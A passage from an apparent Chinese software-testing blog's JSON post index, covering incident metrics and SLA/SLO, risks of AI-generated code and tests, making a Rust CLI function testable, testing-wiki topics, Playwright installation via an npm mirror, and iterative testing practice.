更关注快速反应和初步控制，即使问题还没有完全解决。 在事故生命周期中的位置：\nMTTR 通常代表事故处理的最后阶段。 MTTC 涵盖了从事故开始到初步控制的整个早期阶段。 理解这两个指标的区别很重要，因为它们提供了不同的洞察：MTTC 反映了组织快速响应和控制问题的能力，而 MTTR 则反映了彻底解决问题的能力。在实际操作中，一个组织可能会先关注降低 MTTC 以快速控制损失，然后再着手降低 MTTR 以彻底解决问题。\n两者结合使用，可以全面评估一个组织的事故响应能力和效率。\nSLA和SLO定义 SLA我比较熟悉，但是SLO我就有点孤陋寡闻了，还是让AI来回答好了。\n这两个概念在服务管理和可靠性工程中都非常重要。让我们深入了解：\nSLA（Service Level Agreement）服务级别协议：\n定义：SLA是服务提供商与客户之间签订的正式合同，明确规定了所提供服务的质量、可用性和责任。\n特点：\n具有法律约束力 通常包含具体的数值承诺，如\u0026quot;99.9%的系统可用性\u0026quot; 违反SLA可能会导致赔偿或其他法律后果 用途：\n设定客户期望 明确服务质量标准 为服务评估提供基准 示例：承诺月度系统正常运行时间不低于99.9%，否则给予客户赔偿。\nSLO（Service Level Objective）服务级别目标：\n定义：SLO是服务提供商为特定服务设定的内部性能目标。它是SLA的基础，但通常比SLA更严格。\n特点：\n内部使用，通常不对外公开 比SLA更具体、更严格 没有直接的法律约束力，但是团队的重要工作目标 用途：\n指导内部运营和改进 为团队设定明确的性能目标 帮助预防SLA违约 示例：内部目标是保持系统月度正常运行时间达到99.95%，以确保能满足99.9%的SLA承诺。\nSLA和SLO的关系：\nSLO通常比SLA更严格，为SLA提供缓冲空间。 SLO是达成SLA的内部工具和指南。 公司可能有多个SLO来支持一个SLA。 在实践中，一个明智的策略是设定比SLA更严格的SLO，这样即使偶尔未能达到SLO，也能确保不违反对客户的SLA承诺。这种方法为团队提供了一个安全边际，同时推动持续改进。\n理解并正确使用这两个概念，对于平衡客户满意度、服务质量和运营效率至关重要。它们共同构成了现代服务管理和SRE（Site Reliability Engineering）实践的基础。\n","date":"2024-08-07T09:33:42+08:00","permalink":"zh.ethanhan.cc/p/%E8%B7%9F%E7%BA%BF%E4%B8%8A%E4%BA%8B%E6%95%85%E7%9B%B8%E5%85%B3%E7%9A%84%E5%87%A0%E4%B8%AA%E6%8C%87%E6%A0%87/","title":"跟线上事故相关的几个指标"},{"content":"看到了一篇讨论测试和AI的文章，有些观点确实是非常正确的，顺手翻译了一下，供大家参考。\n我自己读了两遍，发现翻译的版本措辞不够通顺，还是直接给个省流版本好了。\n省流 AI生成的代码开发可能不理解其中的原理，这就为代码变更埋下了隐患，毕竟代码等于是抄的，改抄过来的东西往往不容易 AI每次生成的代码可能风格都不一样，这样用的越多，代码风格百花齐放的可能性就越大，这样在团队协同的时候会带来麻烦 AI生成的代码不好维护，集成进现有代码的难度其实很大 AI写用例很菜，一些异常情况可能考虑不到 AI生成的测试用例是没有测试模型指导的，所以随机性很大，这就导致了用例对功能的覆盖率可能不会很高 AI生成的代码可能引入过时的依赖库和解决方案，从而让团队背上了技术债 泛化型的AI在代码和测试用例生成时可能不会给出最正确的决策，这很好理解，毕竟有些训练数据本身可能质量不高，这就造成了生成的内容质量低下 招聘问题。是招会写代码的人还是招会用ai的人？ 随着生成式AI及其对各行各业的影响成为热门话题,我想探讨一下它将如何影响软件测试,主要基于使用这类AI可能带来的风险。了解这些新工具的潜在风险,有助于我们获得相关信息,并思考将其融入团队时需要采取的测试策略。\n代码质量不如亲自编写 生成式AI通过分析互联网上的内容来根据提示创建代码,这意味着你会继承其他开发者的编码风格和特点。这可能导致我们难以理解为我们生成的代码,从而增加维护和继承的难度。另一个风险是我们可能会想当然地认为AI按照我们的要求执行,而不去验证(因为代码难以理解)。\n这不仅影响产品代码,也会影响测试代码的生成。为应对这个问题,我们可以对代码进行全面的静态分析和重构,以提高其可读性。\n编码习惯和风格不一致 与上述情况类似,AI会采用各种程序员的风格和习惯。这意味着每次要求生成代码时,可能会得到不同的实现方式或编码风格。这同样会影响代码的可维护性和可继承性,缺乏一致性也使问题更难被发现。代码所有权也可能成为问题,因为难以确定是团队中谁的代码。在代码集成方面,不同的编码风格可能难以协调,函数行为可能相互矛盾。\n解决方案仍然是进行更多的静态分析和代码重构,以及对函数行为进行基于代码的测试,以确保代码的可理解性和正确性。\n更高的维护成本 生成的代码可能难以与现有代码很好地融合,因此我们可能不得不替换而非添加代码。这可能导致现有的代码测试失效,增加代码行为偏离预期的风险。替换现有代码还意味着必须重新测试现有功能,特别是如果我们失去了贴近代码的测试,这将增加测试所需的时间。\n对代码(或生成的测试)缺乏理解意味着每次修改代码库时都需要花更多时间进行静态分析。一种应对方法是为测试建立独立的代码库,这样对代码的修改就不会影响测试。测试人员还必须人工审查生成的测试,确保它们与当前的代码库相符。\n生成的代码质量如同实习生水平 生成式AI创建的软件代码或自动化测试可能只达到实习生的水平。它会完成你明确要求的内容,但可能忽视细节或异常情况。这存在测试覆盖不全的风险,也可能无法发现更深层次的问题。任何不确定性都可能导致AI做出与你意图不符的假设,从而影响功能表现。\n应对这种情况的方法是确保继续进行探索性测试和人工测试。测试人员不仅要审查生成的测试,还要继续测试AI已涉及功能的准确性。我们还必须善于减少不确定性,并以不留任何假设空间的方式记录所有要求,以便输入到AI中(不要认为它会有常识并知道失败应该导致错误)。\n缺乏测试模型 由于你可能使用简短的提示而非详细的测试用例,你可能对测试覆盖率缺乏心理预期。如果过度依赖低代码或无代码测试工具,我们可能对代码/软件的行为缺乏深入理解。这可能影响软件的可维护性,并可能导致遗漏或错误测试边缘情况和功能。\n为应对这些风险,我们需要制定计划来探索代码和功能,以了解其工作原理。这种理解可以用于改进生成的自动化测试,并指导我们知道应该测试什么以及如何测试。\n引入不良依赖项导致技术债务 生成式AI可能会引入过时的库,这可能导致代码不受支持或无法正常工作。尝试更新生成的代码可能会失败,或者如果AI引入了我们不知道会发生变化的库,就存在代码突然停止工作而我们不知原因的风险。AI使用的库可能存在安全漏洞,如后门或恶意代码,我们必须诊断和修复这些问题。\n我们必须确保团队分析所使用的库,并在生成的代码中记录这些库,以便检查其有效性。还需要对所有生成的代码进行静态分析,以测试是否存在漏洞和安全缺陷(包括对AI创建的功能进行渗透测试)。\nAI可能做出不直观的决策 所使用的AI可能会在创建代码、测试内容或测试方法上做出糟糕的决定。如果代码不直观,我们可能无法从代码中推断AI所做的假设。这带来了无法理解或维护代码和测试的风险,以及得到无用的测试或遗漏关键内容的风险。\n除了对生成的代码进行静态分析和重构,使其更有意义并找出糟糕的决策外,我们还需要为代码添加更详细和有意义的注释。我们需要训练AI记录它创建的代码,方法是为它提供更好的示例,每个函数和测试都需要真正有意义的注释。这将训练AI做同样的事情,并让我们能够更好地诊断错误。\n招聘偏向AI提示编写技能? 团队可能开始过度重视招聘能够编写AI提示的人,而不是注重测试或编码技能。这可能导致工程团队对软件开发了解不足,无法诊断和纠正低代码开发带来的问题。这意味着我们可能面临无法修复的技术债务,或者团队无法处理重大的底层架构问题。\n测试人员需要挑战假设或帮助消除团队的不确定性,以创建有效的AI提示。他们还将在审查生成代码的含义、可维护性和潜在工程缺陷方面发挥重要作用。这可能意味着高级工程师更有可能成为测试人员,因为他们可以制定处理生成代码的策略,或者可能需要准备(并倡导)从头重建系统。\n我们可能还需要帮助教育行业了解过度重视AI技能而忽视工程和测试技能所带来的风险。组织可能想要专注于雇用能使用低代码解决方案的更便宜的工程师,而没有意识到其中固有的风险。\n来源\n","date":"2024-08-07T09:23:52+08:00","permalink":"zh.ethanhan.cc/p/%E5%85%B3%E4%BA%8E%E7%94%9F%E6%88%90%E5%BC%8Fai%E5%9C%A8%E6%B5%8B%E8%AF%95%E8%A1%8C%E4%B8%BA%E4%B8%AD%E7%9A%84%E6%80%9D%E8%80%83/","title":"关于生成式AI在测试行为中的思考"},{"content":"之前写过一篇文章讨论如何去做hello world的单元测试，当时想到的一个方法是将hello world抽象成1个函数，这个函数返回hello world字符串，然后测试这个函数的返回值就好了，代码大概如下所示。\n1 2 def hello_world(): return \u0026#34;hello world\u0026#34; 前几天看到rust cli手册里的一个做法，比上面的方案更加的合理，这里忍不住分享一下。\n更优雅的解决方案 测试功能有两种互补的方法:测试构建完整应用程序的小单元,这些称为\u0026quot;单元测试\u0026quot;。还有从\u0026quot;外部\u0026quot;测试最终应用程序,称为\u0026quot;黑盒测试\u0026quot;或\u0026quot;集成测试\u0026quot;。让我们从第一种开始。\n为了弄清楚我们应该测试什么,让我们看看我们的程序功能是什么。主要来说,grrs应该打印出与给定模式匹配的行。因此,让我们为此编写单元测试:我们要确保我们最重要的逻辑能正常工作,并且我们要以一种不依赖于周围任何设置代码(例如处理CLI参数)的方式来做到这一点。\n回到我们对grrs的第一个实现,我们在main函数中添加了这段代码:\n1 2 3 4 5 6 // ... for line in content.lines() { if line.contains(\u0026amp;args.pattern) { println!(\u0026#34;{}\u0026#34;, line); } } 遗憾的是,这不太容易测试。首先,它在main函数中,所以我们不能轻易调用它。这可以通过将这段代码移到一个函数中来轻松解决:\n1 2 3 4 5 6 7 fn find_matches(content: \u0026amp;str, pattern: \u0026amp;str) { for line in content.lines() { if line.contains(pattern) { println!(\u0026#34;{}\u0026#34;, line); } } } 现在我们可以在测试中调用这个函数,看看它的输出是什么:\n1 2 3 4 #[test] fn find_a_match() { find_matches(\u0026#34;lorem ipsum\\ndolor sit amet\u0026#34;, \u0026#34;lorem\u0026#34;); assert_eq!( // 呃呃呃 或者\u0026hellip;我们能吗？现在,find_matches直接打印到stdout,即终端。我们不能在测试中轻易捕获这个!这是在实现之后编写测试时经常出现的问题:我们编写了一个与使用它的上下文紧密集成的函数。\n注意:在编写小型CLI应用程序时,这完全没问题。不需要让一切都可测试!然而,思考你可能想要为代码的哪些部分编写单元测试是很重要的。虽然我们将看到改变这个函数使其可测试很容易,但情况并非总是如此。\n好的,我们怎样才能让它可测试呢?我们需要以某种方式捕获输出。Rust的标准库有一些处理I/O(输入/输出)的巧妙抽象,我们将使用其中一个叫做std::io::Write的。这是一个抽象了我们可以写入的东西的trait,包括字符串但也包括stdout。\n如果这是你第一次在Rust上下文中听到\u0026quot;trait\u0026quot;这个词,那你有福了。Trait是Rust最强大的特性之一。你可以把它们想象成Java中的接口,或者Haskell中的类型类(取决于你更熟悉哪个)。它们允许你抽象可以由不同类型共享的行为。使用trait的代码可以以非常通用和灵活的方式表达想法。这也意味着它可能变得难以阅读。不要让这吓到你:即使使用Rust多年的人也不总是立即理解泛型代码在做什么。在这种情况下,考虑具体用途会有帮助。例如,在我们的例子中,我们抽象的行为是\u0026quot;写入它\u0026quot;。实现(\u0026ldquo;impl\u0026rdquo;)它的类型的例子包括:终端的标准输出,文件,内存中的缓冲区,或TCP网络连接。(向下滚动std::io::Write的文档以查看\u0026quot;实现者\u0026quot;列表。)\n有了这些知识,让我们改变我们的函数以接受第三个参数。它应该是任何实现Write的类型。这样,我们就可以在测试中提供一个简单的字符串,并对其进行断言。这是我们如何编写这个版本的find_matches:\n1 2 3 4 5 6 7 fn find_matches(content: \u0026amp;str, pattern: \u0026amp;str, mut writer: impl std::io::Write) { for line in content.lines() { if line.contains(pattern) { writeln!(writer, \u0026#34;{}\u0026#34;, line); } } } 新参数是mut writer,即一个可变的我们称之为\u0026quot;writer\u0026quot;的东西。它的类型是impl std::io::Write,你可以理解为\u0026quot;任何实现Write trait的类型的占位符\u0026quot;。还要注意我们如何用writeln!(writer, …)替换了之前使用的println!(…)。println!的工作方式与writeln!相同,但总是使用标准输出。\n现在我们可以测试输出:\n1 2 3 4 5 6 #[test] fn find_a_match() { let mut result = Vec::new(); find_matches(\u0026#34;Loren ipsum\\ndolor sit amet\u0026#34;, \u0026#34;lorem\u0026#34;, \u0026amp;mut result); assert_eq!(result, b\u0026#34;lorem ipsum\\n\u0026#34;); } 要在我们的应用程序代码中使用这个,我们必须通过添加\u0026amp;mut std::io::stdout()作为第三个参数来改变main中对find_matches的调用。这里是一个main函数的例子,它基于我们在前几章中看到的内容,并使用我们提取的find_matches函数:\n1 2 3 4 5 6 7 8 9 fn main() -\u0026gt; Result\u0026lt;()\u0026gt; { let args = Cli::parse(); let content = std::fs::read_to_string(\u0026amp;args.path) .with_context(|| format!(\u0026#34;could not read file `{}`\u0026#34;, args.path.display()))?; find_matches(\u0026amp;content, \u0026amp;args.pattern, \u0026amp;mut std::io::stdout()); Ok(()) } 注意:由于stdout期望字节(而不是字符串),我们使用std::io::Write而不是std::fmt::Write。因此,我们在测试中给出一个空数组作为\u0026quot;writer\u0026quot;(它的类型将被推断为Vec),在assert_eq!中我们使用b\u0026quot;foo\u0026quot;。(b前缀使这成为一个字节字符串字面量,所以它的类型将是\u0026amp;[u8]而不是\u0026amp;str)。\n注意:我们也可以让这个函数返回一个String,但那会改变它的行为。它不会直接写入终端,而是将所有内容收集到一个字符串中,并在最后一次性转储所有结果。\n读者练习:writeln!返回一个io::Result,因为写入可能失败,例如当缓冲区已满且无法扩展时。为find_matches添加错误处理。\n我们刚刚看到了如何使这段代码易于测试。我们\n识别了我们应用程序的核心部分之一, 将它放入自己的函数中, 并使它更加灵活。 尽管目标是使它可测试,但我们最终得到的结果实际上是一段非常惯用和可重用的Rust代码。这太棒了!\n总结 这里优雅的部分在于主体功能并没有因为测试而进行一些很不自然的重构，比如我之前解决方案中返回hello world的函数。\n这里直接用了一个类似于buffer的解决方案，把需要打印的内容放到1个result writer里，可以简单理解成是缓存起来了，而且可以直接读出来，我们只要断言读出来的那部分结果就好了。\n更值得称道的是，这里用了trait的方式进行了泛化处理，使得任何实现了Write trait的类型都可以作为参数传进去，并进行测试。\n","date":"2024-08-02T17:33:25+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E7%9A%84%E6%B5%8B%E8%AF%95cli%E5%BA%94%E7%94%A8/","title":"如何优雅的测试cli应用"},{"content":"之前翻译了一版我认为是史上最全的测试 wiki，并把内容作为测试知识库放到了 itest.info，也就是重定向学院的网站上面。\n一段时间过去了，前几天我偶然看了一下百度统计里的结果，发现这些 wiki 内容竟然已经有自然流量了，尽管翻译的效果不是很好，但有访问就是好事，可以重点去优先那些大家都在搜索的页面了。\n热门内容 我稍微统计了一下，热门的测试知识点有下面几个。\n测试规范(测试规格说明书) 可能是这个条目的英文把大家给迷惑了，英文叫做 test specification，直接翻译过来就是测试规范。\n大家在工作中遇到一些质量管理的问题时总会想着去学一下别人是怎么做的，有没有好的管理流程和质量规范。\n但这个条目的测试规范不是我们所理解的在测试里的准入和准出标准，或者跟流程相关的内容，这里的测试规范实际上是测试规格说明书。它包含下面这些内容。\n测试范围：明确定义需要测试和不需要测试的内容，确保测试的重点和效率。 测试目标：概述测试的目标和目的，提供方向和成功标准。 测试标准：指定通过/不通过的标准，包括进入和退出条件。 测试环境：描述进行测试时的硬件、软件、网络配置和其他条件。 测试用例：详细描述每个测试，包括步骤、预期结果和测试数据。 可追溯矩阵：将测试用例与需求关联，确保覆盖和责任。 测试交付物：列出测试过程的输出，如报告、日志和缺陷摘要。 资源规划：识别测试所需的人员、工具和其他资源。 进度和估算：提供测试准备、执行和评估的时间表。 风险分析：评估测试过程中潜在的风险，并制定缓解策略。 假设和依赖：记录进行测试所需的前提条件或假设。 这更像是描述测试管理理念的终极文档。包含了测试范围，测试规划，测试环境和测试产出等，是个纲领性质的东西。\n如果大家有搭建测试团队或者团队管理的需求，可以参考这个条目的内容，我已经重新翻译过了，尽量做到英文内容的忠实还原。\n地址: https://www.itest.info/wiki/test-specification\n故障注入测试 故障注入测试(FIT)是一种测试人员故意向系统引入错误,以评估其健壮性和错误处理能力的方法。这种技术通过模拟故障来观察系统在意外情况下的表现,确保它能够优雅地处理和恢复故障。\n这个条目也是大家热搜的内容，这是因为近年来故障注入的好处越来越被更多人知晓。\n故障注入测试的主要好处包括:\n• 增强系统稳定性:通过故意引入故障,可以在不利条件下测试系统,确保它能优雅地处理意外情况。\n• 提高容错能力:它验证了故障处理机制的有效性,从而打造出更具弹性的软件。\n• 系统加固:让系统暴露于故障中有助于识别并加强薄弱环节,降低生产环境中出现故障的可能性。\n• 提升可靠性:通过确认系统在故障条件下的正确行为,整体可靠性得到提高。\n• 改善风险管理:有助于识别潜在风险及其影响,从而制定更好的缓解策略。\n• 主动发现问题:故障注入测试能发现常规测试可能无法发现的隐藏 bug。\n• 验证监控和告警:确保监控系统能按预期检测并提醒故障。\n• 符合行业标准:某些行业要求验证容错能力,这可以通过故障注入来实现。\n• 节省成本:早期发现故障可以节省软件开发生命周期中与停机时间和后期修复 bug 相关的成本。\n• 洞察系统行为:它提供了对系统在压力下行为的深入理解,可以指导未来的开发和测试工作。\n该条目除了解释了故障注入的原理和概念，还推荐了一些常用工具。\n地址: https://www.itest.info/wiki/fault-injection-testing\n基准测试 这是在性能测试中经常引入的概念。\n我们可以在某个时间点以当时系统的性能作为基准，然后每次发布之前都去做一次性能测试，从而对比系统的性能有没有劣化，如果有的话则要进行修改和优化。\n地址: https://www.itest.info/wiki/baseline-testing\n背靠背测试 这个我确实不知道，之前也没听说过。\n背靠背测试（Back-to-back testing）是一种软件测试方法，它涉及到比较两个不同版本（通常是现有系统）的输出，以验证它们在一系列测试用例下的行为是否相同。这种测试方法在将遗留系统迁移到新平台或重构代码时特别有用，以确保新系统的行为与旧系统一致，同时避免引入回归错误。\n从我的角度上看，这更像是一种测试策略，而不是测试方法。\n并且如果拿一个版本作为基准的话，这实际上也是一种基准测试的方式。\n总结 这些测试知识库里的内容可以被人搜索到浏览到对我来说都是莫大的欣喜。\n也希望今天分享的内容会对大家有所帮助。\n","date":"2024-07-25T21:37:38+08:00","permalink":"zh.ethanhan.cc/p/%E6%B2%A1%E6%83%B3%E5%88%B0%E6%B5%8B%E8%AF%95%E7%9F%A5%E8%AF%86%E5%BA%93%E7%AB%9F%E7%84%B6%E8%BF%98%E7%9C%9F%E6%9C%89%E4%BA%BA%E8%AE%BF%E9%97%AE/","title":"没想到测试知识库竟然还真有人访问"},{"content":"这几天录视频，在 windows 电脑上试着去安装了一下 javascript 版本的 playwright，发现有点难度，主要是网络联通性有挑战，这里简单记录一下。\n安装 nodejs 首先我们需要安装 nodejs，这里略过。\n我的安装的版本是Node.js v20.15.1。\n最重要的步骤：设置 npm 源 对于国内用户来说，这一步至关重要，是解决网络联通性的关键。\n打开命令行，输入下面的命令。\n如果你对命令行不熟悉，那么 win 11 系统里，随便打开 1 个文件夹，鼠标右键打开系统菜单，选择在终端中打开就可以了。\n我们在终端里输入下面的命令，大部分情况下，不需要我们手动一个字符一个字符输入，只要在 playwright 中文站的安装教程里拷贝具体的命令，然后右键点击终端就可以粘贴了。\n1 npm config set registry https://registry.npmmirror.com 使用 npm 安装 playwrgiht 如果你对命令行熟悉的话，可以新建 1 个文件夹 demo，然后从命令行里cd进去，再运行下面的命令。\n如果你对命令行不熟悉，那么 win 11 系统里，我们可以新建 1 个文件夹 demo，进入 demo 文件夹，鼠标右键打开系统菜单，选择在终端中打开就可以了。\n1 npm init playwright@latest 安装选项 命令运行时会出现 4 个问题，全部按 Enter 选择默认值\n✔ Do you want to use TypeScript or JavaScript? · TypeScript ✔ Where to put your end-to-end tests? · tests ✔ Add a GitHub Actions workflow? (y/N) · false ✔ Install Playwright browsers (can be done manually via \u0026rsquo;npx playwright install\u0026rsquo;)? (Y/n) · true 等待一段时间后就可以看到 playwright 已经安装成功了。\n安装 vscode 以及 playwright 插件 这一步不是必须的，但如果你不熟悉命令行的话，那么还是非常推荐的。\n在 vscode 插件市场搜索 playwright 插件，安装微软官方出的那个插件，一般情况下就是排第 1 位的那个。\n使用 vscode 打开 demo 文件夹 首先用 vscode 打开我们刚才新建的 demo 项目，然后在进行下面的配置。\nprojects 选择 chrome settings 里面选择show trace viewer 打开tests文件夹下的example.spec.ts文件。\n然后点击test方法旁的三角形按钮，就可以运行用例了。\n运行用例 在运行默认用例时可能因为网络原因出现失败的情况，这时候可以把第 1 个用例改一下。\n1 2 3 4 5 6 test(\u0026#34;has title\u0026#34;, async ({ page }) =\u0026gt; { await page.goto(\u0026#34;https://playwright.itest.info/\u0026#34;); // Expect a title \u0026#34;to contain\u0026#34; a substring. await expect(page).toHaveTitle(/Playwright/); }); 我们把用例里的playwrgith.dev改成playwright.itest.info，再次运行，不出意外的话用例会成功运行通过 ✅。\n思考题 1 await expect(page).toHaveTitle(/Playwright/); 用中文去说明这个断言的具体检查了什么内容？\n","date":"2024-07-23T14:18:05+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85playwright-2024%E7%89%88%E6%9C%AC/","title":"如何安装playwright 2024版本"},{"content":"经过两个星期的努力，我终于肝完了 playwright 中文站的主要内容。\n站点地址 playwright.itest.info\n后面我会把精力放到 playwright 的原创教程上去，预计也会在这两周发布吧。\n这次技术选型的时候遇到了一些问题，肝到快结束才发现 zola 并不支持中文索引的能力，也就是说搜索功能就没办法实现了。\n所以我搞了个全部教程的 archive 页面，大家需要搜索的话可以可以在全部教程页面进行搜索。\n目前全站应该更新了 90 篇左右的资料，涉及到 playwright 的基础，框架设计，api 测试以及各种最佳实践，技术含量还是不错的。\n在整理和翻译教程的过程中，我自己对 playwright 也有了比较深入的了解，对目前正在写的 playwright 教程的帮助很大，一些实现和配置目前基本上手到擒来，所以建站的过程也是一个非常好的学习的过程，付出和收获是对等的。\n另外一些文章翻译的质量不是很高，比如有一篇关于 playwright 视觉测试的教程，英文内容本来是很好的，不过翻译过来之后就显得牛头不对马嘴，我自己理解起来都觉得费劲，所以下周我决定抽时间把这篇教程本地化一下，做一个高质量的视频教程。\n因为写了很多爬虫的关系，站点的内容应该会持续更新下去的，后面有机会的话看能不能把之前 selenium 的内容也整理出来，做一个 selenium 的中文教程站，毕竟现在对静态网站的制作也是非常得心应手了。\n推荐内容 我精选了一些我认为比较好的内容，我把教程的名字放在这里，感兴趣的内容大家自行去所有教程的存档页面搜索就可以了。\n如何让 playwright 运行的更快: 非常实用，特别是你的自动化代码足够多的话 如何使用 Playwright 监控 JavaScript 控制台日志和异常: 监听页面的pageerror事件，对实时前端页面监控很有意义 挖掘 playwright 的隐藏宝藏: 各种最佳实践，量大管饱 全面的基于 Playwright 的 ui 自动化测试，使用页面对象模型的模块化框架: 用 playwright+po 实现测试框架 Playwright: 如何正确使用 fixture 构建页面对象: 使用 fixture 来组织 po，这个实践的工程化水平很高，推荐 使用 playwrigth api 测试: 用 playwright 做 api 测试，这一系列教程确实写的很好 如何使用组件来重构 playwright 的代码: 在元素之上，page 之下还可以抽象 1 个组件层，代码思想很好 最后 创作内容和维护内容不易，希望这个站点对大家会有所帮助。\n","date":"2024-07-18T20:27:32+08:00","permalink":"zh.ethanhan.cc/p/%E6%88%91%E7%BB%88%E4%BA%8E%E8%82%9D%E5%AE%8C%E4%BA%86playwright%E7%9A%84%E4%B8%AD%E6%96%87%E7%AB%99/","title":"我终于肝完了playwright的中文站"},{"content":"我花了一周的时间肝了个 playwright 的教程站，域名是 playwright.itest.info，事情的起因还要从 1 个油管视频说起。\n我从那个视频上了解到，1 个做 AI 硬件的公司把 playwright 的自动化操作功能跟 AI 硬件结合了起来，融了 2000 万美金。\n这让我大受震撼。\n首先我没想到这么高大上的产品竟然用的是如此朴实无华的技术，更让我感到惊讶的是这家公司选择的工具是 playwright，而不是自动化届的老大哥 selenium。毕竟如果从纯技术的角度上考虑，selenium 是在原生浏览器上跑的，它的兼容性其实更好。\n看来 playwright 确实是有它独到之处的。\n这也让我陷入了思考，可能大部分人学习 ui 自动化工具的初衷不是测试，而是赚钱。\n毫无疑问，在 2024 年的今天，playwright 是最有钱景的自动化测试工具，当然了，是金钱的钱。\n不过我发现 playwright 的中文资料非常有限，所以我和虫师创建了这个站点，希望可以一直维护下去吧。\n关于目前的进度 目前上线的版本有大概 24 篇左右的原创加翻译的资料。\n我写了个爬虫去关注 playwright 的最新进展，也爬了 120 多篇非常优秀的英文教程。后面我会持续更新，这样一来资料会更加丰富一些。\n除了翻译，我目前主要的精力是放在了原创教程上。在 playwright 可以找到的资料里，大部分的内容都是和自动化测试相关的，这些内容很好，不过我想如果我的教程把关注的重点放在爬虫和自动操作上，那么是不是受众会更广泛一些。\n爬虫可以获取数据，在 AI 大行其道的今天，数据是各种大语言模型的基础。\n自动化操作可以提升工作效率，在提效这个赛道上，永远是有商机可以挖掘的。\n所以我开始肝一套 playwright 的中文教程，可以写的素材相当的丰富，既然要写很多，那么不如就写一本书吧。\n目前书籍的进度大概是这样的，typescript 版本应该完成了有 50%了，等肝完 ts 的版本，再花点时间把 python 版本结束掉。\n关于网站内容的质量，翻译的文章，我尽量翻译的通俗易通，然而水平毕竟有限，一些翻译的资料中会出现比较神奇的表达，希望大家可以多多指正。\n原创的文章我会尽量做到深入浅出，让大家容易理解。\n另外 playwright 的 api 变化很快，之前已经过期的内容我这边会人肉过滤掉，尽量保证呈现出的内容是最新的，一些翻译文章里我会加入自己的看法，明目张胆的夹带私货了。\n结束掉文本资料的部分后，我会根据教程的内容录制一套 playwright 的视频教程，也会把重点放在爬虫和自动化操作上。\n最后汇报一下这里用到建站技术 教程网站我是用zola和tailwindcss去搭建的。zola 是 rust 语言编写的静态站点生成引擎，跟 go 语言里的 Hugo 非常相似。tailwindcss 我比较熟悉，所以前端界面就交给它了。大家把玩一下就可以看出，因为是静态站点，所以网站的响应速度还是比较快的。\n教程书籍我是用 rust 社区的 mdbook 去写的，这也是个静态站点的生成引擎，不过这个工具是专业写文档的，上手容易，用起来也很舒服。\n最后大家如果对现在对 playwright 感兴趣的话，目前 b 站上虫师的那套 playwright 入门教程是非常不错的选择，强烈推荐。\n","date":"2024-07-12T09:25:00+08:00","permalink":"zh.ethanhan.cc/p/%E6%88%91%E8%82%9D%E4%BA%86%E4%B8%80%E4%B8%AAplaywright%E7%9A%84%E6%95%99%E7%A8%8B%E5%8F%8A%E8%B5%84%E8%AE%AF%E7%AB%99/","title":"我肝了一个playwright的教程及资讯站"},{"content":"这是一个常见的经典问题，答案见仁见智，下面是一种比较普遍的观点。\n这取决于你对“所有内容”的定义。\n你可能指的是对整个应用程序进行全面的回归测试，包括所有功能、负面路径、边缘情况等。你说得对——除了一些非常小的产品外，你不可能在每次迭代中做所有这些事情。\n但事实是：你不应该在每次迭代中进行这种全面的测试，你不应该觉得有必要这样做，也不应该被要求这样做。\n迭代是敏捷软件开发中的概念——在软件长期开发并在最后一次性交付的模式中，“迭代”这个词没有意义。\n迭代开发软件的全部意义在于引入小而有价值的变更并将其交付给用户。由于变更很小，产品的大部分与之前相同，因此不需要再次进行全面验证。假定它在过去已经被测试过了。\n但也许变更的范围比看起来更广，或者它们在程序的其他部分引入了意想不到的后果。\n这些都是合理的担忧。然而，开发人员引入的大多数变更并不影响整个系统，你不应该默认认为它们可能会这样。\n值得补充的是，如果团队经常发现自己处于变更波及整个系统并需要全面测试的情况，那就是存在更深层次问题需要解决的迹象。\n这可能意味着系统架构有问题，团队应该认真考虑偿还技术债务。 或者也许软件更像是一个原型、概念验证，而不是解决方案。在这种情况下，在团队更好地理解需求和利益相关者可以批准一种方法之前，可能不需要全面测试。许多测试人员在这种环境中工作时感到困难。他们将自己的角色视为可能存在缺陷的软件与用户之间的最后一道防线。他们对用户可能得到未经全面测试和验证的软件感到不安。\n如果你是其中之一，你需要理解这种风险是经过计算的，也是重视短迭代和频繁交付的软件开发模式固有的。这些想法相互强化。产品没有经过全面测试，这意味着可能存在用户遇到前未被发现的错误、失误和问题。但正因为产品没有经过全面测试，它可以更快地发布。当团队了解到软件中的问题时，他们可以修复并进行新的发布。\n如果这个论点不能说服你，我建议你尝试一下。承认你个人并不认同这种方法，但如果这是团队想做的，就不要阻止它。在几次发布中保留你的保留意见，看看会发生什么。你可能会发现产品的质量实际上并没有明显低于以前。如果结果显示质量确实下降了，那么你将有坚实的经验数据向团队展示。大多数人会同意这些结果是不理想的，需要某种改变。\n最后，你不应该被要求在每次迭代中进行全面测试。\n就我个人而言，我在这方面没有太多经验——我从未在试图这样做的团队中工作过。虽然我不能说在这种情况下什么方法可能有效，但我猜想首先要做的是理解这种要求背后的立场。也许需要教导利益相关者迭代的权衡；或者也许团队需要采用更谨慎的软件开发模式，以牺牲速度为代价。\n我还没有提到自动化，它对以上所有观点都有贡献。作为测试人员，你的工作应该得到自动化的支持，至少每天运行一次，并提供关于产品状态的最新可靠信息。虽然自动化有限制，不能检查所有内容，但它可以检查一些行为。\n你应该了解在你的项目中自动化能做什么和不能做什么，这样你就可以对哪些功能和路径不需要花费太多时间做出明智的决定。你应该对自动化结果有信心。当有人要求你反复执行特定测试时，你可以将其视为讨论花些时间改进自动化的机会。\n在这篇文章的开头，我说过答案取决于“所有内容”的含义。它可能意味着全面测试，这是我到目前为止关注的重点。但它也可能意味着迭代期间发生变化的所有内容。\n确实会发生开发人员完成了如此多的工作，以至于团队中的测试人员应接不暇的情况。不久前我就遇到过这种情况，对我们有效的方法是推动整个团队的所有权。大多数开发任务不需要专门的测试人员来测试或验证——它们只需要由没有编写代码的人来测试。在我们的案例中，我们所要做的就是在站会上表明问题，团队其他成员很快就想出了解决方案——一些开发人员应该停止接受新工作，而是专注于测试已经完成的内容。为每个任务明确列出完成的定义和验收标准肯定会有所帮助。\n然而，处理这个问题的最好方法是主动避免它。总的来说，作为测试人员，尽量尽快测试变更。不要等到迭代结束。如果团队实践基于 PR 的工作流程，你可以尝试在代码合并之前测试创建的开发版本。让 CI 系统为每个 PR 